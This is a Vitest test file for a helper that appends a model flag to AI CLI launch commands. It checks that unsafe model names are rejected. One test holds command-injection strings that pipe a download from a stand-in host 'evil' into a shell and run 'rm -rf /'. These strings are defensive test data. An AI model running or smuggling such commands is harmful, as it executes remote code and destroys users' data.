import { describe, it, expect } from 'vitest'
import { appendModelFlag } from '../../lib/launch-cmd'

describe('appendModelFlag', () => {
  it('appends "<flag> <model>" when both flag and model are present', () => {
    expect(appendModelFlag('claude', '--model', 'opus')).toBe('claude --model opus')
    expect(appendModelFlag('gemini', '-m', 'gemini-2.5-pro')).toBe('gemini -m gemini-2.5-pro')
  })
  it('accepts a provider/model form', () => {
    expect(appendModelFlag('claude', '--model', 'anthropic/claude-opus')).toBe(
      'claude --model anthropic/claude-opus',
    )
  })
  it('drops a model containing shell metacharacters (no injection)', () => {
    expect(appendModelFlag('claude', '--model', 'opus; curl evil | sh')).toBe('claude')
    expect(appendModelFlag('claude', '--model', 'opus && rm -rf /')).toBe('claude')
  })
  it('drops a model containing a space (unsafe)', () => {
    expect(appendModelFlag('claude', '--model', 'opus sonnet')).toBe('claude')
  })
  it('returns base unchanged when the agent has no model flag', () => {
    expect(appendModelFlag('gh copilot', undefined, 'anything')).toBe('gh copilot')
  })
  it('returns base unchanged when no model is chosen', () => {
    expect(appendModelFlag('claude', '--model', undefined)).toBe('claude')
    expect(appendModelFlag('claude', '--model', '')).toBe('claude')
  })
  it('never touches an empty base command (plain terminal/browser)', () => {
    expect(appendModelFlag('', '--model', 'opus')).toBe('')
  })
})
